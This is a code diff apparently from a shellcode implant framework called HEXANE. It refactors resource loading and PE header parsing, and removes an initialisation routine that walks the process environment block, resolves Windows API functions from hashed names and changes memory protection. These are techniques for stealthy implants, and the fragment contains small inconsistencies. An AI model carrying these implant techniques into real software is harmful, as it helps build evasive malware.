@@ -15,7 +15,7 @@ namespace Memory {
             HRSRC rsrcInfo	= { };
             PRESOURCE object = (RESOURCE*) Ctx->Win32.RtlAllocateHeap(Ctx->Heap, 0, sizeof(RESOURCE));
 
-            rsrcInfo  = ctx->win32.FindResourceA(base, MAKEINTRESOURCE(rsrcId), RT_RCDATA);
+            rsrcInfo  = Ctx->Win32.FindResourceA(base, MAKEINTRESOURCE(rsrcId), RT_RCDATA);
 			if (!rsrcInfo) {
 				return nullptr;
 			}
@@ -23,55 +23,24 @@ namespace Memory {
             object->GLobal  = Ctx->Win32.LoadResource(base, rsrcInfo);
             object->Size  	= Ctx->Win32.SizeofResource(base, rsrcInfo);
             object->Lock  	= Ctx->Win32.LockResource(object->Global);
-
 defer:
             return object;
         }
 
         VOID FindHeaders(EXECUTABLE *exe) {
-            exe->NtHead = (PIMAGE_NT_HEADERS) (B_PTR(exe->buffer) + ((PIMAGE_DOS_HEADER)exe->buffer)->e_lfanew);
-            exe->Symbols = (PCOFF_SYMBOL) (B_PTR(exe->buffer) + exe->nt_head->FileHeader.PointerToSymbolTable);
-            exe->Exports = (PIMAGE_EXPORT_DIRECTORY) (B_PTR(exe->buffer) + exe->nt_head->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
-			exe->Size 	= (SIZE_T) (B_PTR(exe->buffer) + exe->nt_head->OptionalHeader.SizeOfImage);
+            exe->NtHead 	= (PIMAGE_NT_HEADERS) ((PBYTE)exe->Data + ((PIMAGE_DOS_HEADER)exe->Data)->e_lfanew);
+            exe->Symbols 	= (PCOFF_SYMBOL) ((PBYTE)exe->Data + exe->NtHead->FileHeader.PointerToSymbolTable);
+            exe->Exports 	= (PIMAGE_EXPORT_DIRECTORY) ((PBYTE)exe->Data + exe->NtHead->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
+			exe->Size 		= (SIZE_T) ((PBYTE)exe->Data + exe->NtHead->OptionalHeader.SizeOfImage);
         }
     }
 
     namespace Context {
         BOOL ContextInit() {
             // Courtesy of C5pider - https://5pider.net/blog/2024/01/27/modern-shellcode-implant-design/
-            HEXANE instance = { };
+
 			SIZE_T size = sizeof(LPVOID);
 			ULONG protect = 0;
-
-            instance.teb = NtCurrentTeb();
-            instance.heap = instance.teb->ProcessEnvironmentBlock->ProcessHeap;
-
-            instance.teb->LastErrorValue = ERROR_SUCCESS;
-
-            if (!(instance.modules.kernel32 = (HMODULE)FindModuleEntry(KERNEL32)->DllBase) ||
-				!(instance.modules.ntdll = (HMODULE)FindModuleEntry(NTDLL)->DllBase)) {
-                return false;
-            }
-
-            F_PTR_HMOD(instance.win32.RtlAllocateHeap, instance.modules.ntdll, RTLALLOCATEHEAP);
-            F_PTR_HMOD(instance.win32.NtProtectVirtualMemory, instance.modules.ntdll, NTPROTECTVIRTUALMEMORY);
-            F_PTR_HMOD(instance.win32.FlushInstructionCache, instance.modules.kernel32, FLUSHINSTRUCTIONCACHE);
-
-            if (!instance.win32.RtlAllocateHeap || !instance.win32.NtProtectVirtualMemory) {
-                return false;
-            }
-
-            VOID *global = RVA(LPVOID, instance.base.address, &__global);
-			VOID *glob_a = global;
-
-			if (!NT_SUCCESS(instance.win32.NtProtectVirtualMemory(NtCurrentProcess(), &glob_a, &size, PAGE_READWRITE, &protect)) ||
-				!(C_DREF(global) = instance.win32.RtlAllocateHeap(instance.heap, HEAP_ZERO_MEMORY, sizeof(_hexane)))) {
-                return false;
-            }
-
-            MemCopy(C_DREF(global), &instance, sizeof(_hexane));
-            MemSet(&instance, 0, sizeof(_hexane));
-            //MemSet(global + sizeof(LPVOID), 0, 0xe);
 
             return true;
         }
